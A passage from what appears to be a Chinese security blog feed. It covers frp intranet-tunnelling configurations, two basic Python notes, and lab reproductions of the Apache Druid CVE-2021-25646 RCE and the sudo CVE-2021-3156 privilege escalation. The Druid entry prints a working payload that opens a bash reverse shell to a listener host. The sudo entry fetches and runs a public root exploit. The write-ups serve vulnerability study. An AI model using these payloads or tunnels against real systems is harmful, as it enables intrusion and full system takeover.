<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">#  访问时使用服务端 vhost_http_port 参数设置的端口进行访问</span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; http             #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">custom_domains &#x3D; 192.168.0.190  #  服务端 IP</span><br></pre></td></tr></table></figure>
<ul>
<li>3）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http_ip-2.png"></li>
</ul>
<p>3、基于域名访问 http</p>
<ul>
<li>1）配置服务端 frps.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）配置客户端 frpc.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; http             #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）</span><br><span class="line">custom_domains &#x3D; www.test.com   #  设置需代理的域名（需能正常访问）</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li><p>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src= "/img/loading.gif" data-lazy-src="http/http.png"></p>
</li>
<li><p>4）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http-2.png"></p>
</li>
</ul>
<p>4、基于域名访问 https<br><strong>此处环境更改为:</strong><br>VMware 15</p>
<ul>
<li>kali-1（服务端） IP：192.168.0.190（桥接模式，代替公网）</li>
<li>Centos（客户端，搭建了 DNS、https 服务） IP：192.168.201.152（NAT模式，内网）</li>
</ul>
<br>
- 1）配置服务端 frps.ini

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000            #  服务端 frp 监听的端口</span><br><span class="line">vhost_https_port &#x3D; 4433     #  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）配置客户端 frpc.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[https]                         #  代理名称</span><br><span class="line">type &#x3D; https                    #  协议类型</span><br><span class="line">custom_domains &#x3D; www.test.com   #  设置需代理的域名（需能正常访问）</span><br><span class="line">plugin &#x3D; https2http             #  加载 https2http 插件</span><br><span class="line">plugin_local_addr &#x3D; 127.0.0.1</span><br><span class="line">plugin_crt_path &#x3D; &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;localhost.crt      #  设置本地证书</span><br><span class="line">plugin_key_path &#x3D; &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;private&#x2F;localhost.key    #  设置本地密钥</span><br><span class="line">plugin_host_header_rewrite &#x3D; 127.0.0.1</span><br><span class="line">plugin_header_X-From-Where &#x3D; frp</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p>
<ul>
<li>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/hosts.png"></li>
<li>4）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="https.png"></li>
</ul>
<p>5、仪表盘（检查 frp 状态和代理信息的统计）</p>
<ul>
<li>1）配置服务端 frps.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]       #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000            #  服务端 frp 监听的端口</span><br><span class="line">dashboard_port &#x3D; 7500       #  仪表盘监听的端口</span><br><span class="line">dashboard_user &#x3D; admin      #  仪表盘的用户名</span><br><span class="line">dashboard_pwd &#x3D; passwd      #  仪表盘的密码</span><br><span class="line">max_pool_count &#x3D; 5          #  创建地址池连接上限</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）使用浏览器访问并输入用户名跟密码<br><img src= "/img/loading.gif" data-lazy-src="http/dashboard-1.png"><br><img src= "/img/loading.gif" data-lazy-src="http/dashboard-2.png"></li>
</ul>
<p>6、管理界面（用于管理客户端，可实现热加载）</p>
<ul>
<li>1）配置服务端 frps.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br></pre></td></tr></table></figure>
<p>启动服务 <code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）配置客户端 frpc.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line">admin_addr &#x3D; 127.0.0.1          #  管理地址</span><br><span class="line">admin_port &#x3D; 7400               #  监听的端口</span><br><span class="line">admin_user &#x3D; admin              #  访问时的用户名</span><br><span class="line">admin_pwd &#x3D; passwd              #  访问时的密码</span><br><span class="line"></span><br><span class="line">#  管理界面默认只能本地访问，所以需将端口代理出去实现公网访问</span><br><span class="line">[web_admin]                   #  代理名称</span><br><span class="line">type &#x3D; tcp                    #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 7400             #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7400            #  远程端口（访问时使用的端口）</span><br></pre></td></tr></table></figure>
<p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p>
<ul>
<li>3） 服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http_admin.png"></li>
</ul>
<hr>
<h2 id="五、基于-DNS"><a href="#五、基于-DNS" class="headerlink" title="五、基于 DNS"></a>五、基于 DNS</h2><p>1、配置服务端 frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000        #  服务端 frp 监听的端口</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<p>2、配置客户端 frpc.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[ssh]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 6000      #  远程端口（访问时使用的端口）</span><br><span class="line"></span><br><span class="line">[DNS]                   #  代理名称</span><br><span class="line">type &#x3D; udp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 53         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 5333      #  远程端口（访问时使用的端口）</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p>
<p>3、在服务端使用 <code>dig @192.168.0.190 -p 5333 -x 192.168.201.147</code> 查看与 192.168.201.147 相关的域名解析</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/dns-2.png"></p>
<hr>
<h2 id="六、socks5"><a href="#六、socks5" class="headerlink" title="六、socks5"></a>六、socks5</h2><p>1、配置服务端 frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<p>2、配置客户端 frpc.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]                #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000          #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[plugin_socks]              #  代理名称</span><br><span class="line">type &#x3D; tcp                  #  协议类型</span><br><span class="line">remote_port &#x3D; 8899          #  远程端口（服务端连接时使用此端口，如为 0 则服务端随机分配一个端口）</span><br><span class="line">plugin &#x3D; socks5             #  加载 socks5 插件</span><br><span class="line">plugin_user &#x3D; admin         #  用户名</span><br><span class="line">plugin_passwd &#x3D; passwd      #  密码</span><br><span class="line">use_encryption &#x3D; true       #  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; true      #  如为 true 则消息将被压缩</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p>
<p>3、使用 Proxifier 进行连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-1.png"><br>4、点击检查测试是否能正常连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-2.png"><br>5、代理完成<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-3.png"></p>
]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>if __name__ = &#39;__main__&#39;</title>
    <url>/2021/02/09/Python/%E5%87%BD%E6%95%B0/if__name__=&#39;__main__&#39;/if__name__=&#39;__main__&#39;/</url>
    <content><![CDATA[<h2 id="if-name-‘-main-‘"><a href="#if-name-‘-main-‘" class="headerlink" title="if __name__ == ‘__main__‘"></a>if __name__ == ‘__main__‘</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    def_test()</span><br></pre></td></tr></table></figure>
<p>程序的入口，当函数被调用时会从此处开始运行</p>
<ul>
<li>如被导入的模块内没写 <code>if __name__ == &#39;__main__&#39;</code>，则会在模块被导入后自动运行该模块下的函数</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Open 函数</title>
    <url>/2021/02/09/Python/%E5%87%BD%E6%95%B0/open%E5%87%BD%E6%95%B0/open%20%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>open 函数用于打开文件，创建一个文件对象。</p>
<table>
<thead>
<tr>
<th align="center">编码</th>
<th align="center">占位</th>
</tr>
</thead>
<tbody><tr>
<td align="center">UTF-16</td>
<td align="center">一个英文字母或一个汉字字符占两个字节</td>
</tr>
<tr>
<td align="center">UTF-8</td>
<td align="center">一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节。</td>
</tr>
<tr>
<td align="center">Unicode编码</td>
<td align="center">一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</td>
</tr>
</tbody></table>
<h2 id="二、实例："><a href="#二、实例：" class="headerlink" title="二、实例："></a>二、实例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open (&quot;c:\\123.txt&quot;, &quot;rt&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  以只读的文本格式打开 C 盘下的 123.txt 文件并复制给 </p>
<ul>
<li>文件使用完后使用 close 关闭文件</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="center">以只读模式打开文件（默认）</td>
</tr>
<tr>
<td align="center">w</td>
<td align="center">以写入的方式打开文件，会覆盖已存在的文件</td>
</tr>
<tr>
<td align="center">x</td>
<td align="center">如果文件已经存在，使用此模式打开将引发异常</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">以写入模式打开，如果文件存在，则在末尾追加写入</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">以二进制模式打开文件</td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">以文本模式打开（默认）</td>
</tr>
</tbody></table>
<ul>
<li>| 可读写模式（可添加到其他模式种使用）<br>U | 通用换行符</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with opened(r&#39;d:\\xxx.txt&#39;) as fp:</span><br><span class="line">    for line in fp.readlines():</span><br><span class="line">        print line</span><br></pre></td></tr></table></figure>
<p>&emsp;// with 中的代码块在执行的过程中无论发生什么异常，里面的文件最终都会被关闭。</p>
<h2 id="三、常用函数："><a href="#三、常用函数：" class="headerlink" title="三、常用函数："></a>三、常用函数：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.write(&#39;\nabc&#39;)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  插入换行跟字符abc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.writelines(n)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  n为列表，元组等，n内容的类型必须为str，把n的那类容插入到f</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  关闭文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.read(6)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  读取6个字符，包括换行符（默认读取整个文件）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.readline(6)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  读取第一行前6个字符（默认读取第一行）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.readlines()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  读取整个文件返回一个列表，列表每个元素代表一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.seek(offfset, from)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  offset：偏移量 （字节）<br>&emsp;//  from：0-文件开头，1-当前位置，2-文件末尾（默认为0）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.seek(6)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  指针移动到第6个字符的位置，从第7个字节开始打印</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.seek(3, 0)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  从起始位置向后偏移3字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.seek(3, 1)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  从当前位置向后偏移3字节（需加权限b（二进制模式打开））</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.seek(-3, 2)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  从末尾位置向前偏移3字节（需加权限b（二进制模式打开））</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.tell()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回当前在文件中的位置</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Druid CVE-2021-25646 RCE 漏洞复现</title>
    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid 还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。<br>Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Druid &lt; 0.20.1</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取 druid 镜像</span><br><span class="line">sudo docker pull fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 druid 环境</span><br><span class="line">sudo docker run -d -p 8888:8888 fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、Win10 监听 9999 端口</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-1.png"></p>
<p>2、访问 <code>http://192.168.10.233:8888/unified-console.html</code> 并单击 <code>Load data</code></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-1.png"></p>
<p>3、在 <code>Base directory</code> 跟 <code>File filter</code> 处分别填入如下内容，然后单击 <code>Next: Parse data</code> 并抓包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quickstart&#x2F;tutorial&#x2F;</span><br><span class="line">wikiticker-2015-09-12-sampled.json.gz</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-2.png"></p>
<p>4、使用 BP 抓包后构建poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart&#x2F;tutorial&#x2F;&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.10.114&#x2F;9999 0&gt;&amp;1&#39;)&#125;&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;dimension&quot;:&quot;added&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;&quot;:&#123;</span><br><span class="line"> </span><br><span class="line">&quot;enabled&quot;:&quot;true&quot;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;79a5be988bf94d42a6f219b63ff27383&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/bp.png"></p>
<p>5、此时 Win10 已收到反弹的shell</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-2.png"></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到最新版本</p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113573652">https://blog.csdn.net/xuandao_ahfengren/article/details/113573652</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Druid 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux sudo CVE-2021-3156 提权漏洞复现</title>
    <url>/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Sudo 1.8.2 - 1.8.31p2</p>
<p>Sudo 1.9.0 - 1.9.5p1</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取环境</span><br><span class="line">sudo docker pull manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4</span><br><span class="line">#  运行环境</span><br><span class="line">sudo docker run -it manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>新建测试用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test</span><br><span class="line">echo test:123 | chpasswd</span><br><span class="line">su test</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/test_user.png"></p>
<p>查看 sudo 版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/sudo_version.png"></p>
<p>查看系统版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/system_version.png"></p>
<p>找一个有写入权限的目录并下载运行 <a href="https://github.com/blasty/CVE-2021-3156">exp</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">chmod +x sudo-hax-me-a-sandwich</span><br><span class="line">.&#x2F;sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/exp.png"></p>
<p>查看 <a href="https://github.com/blasty/CVE-2021-3156">exp</a> 可用目标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure>
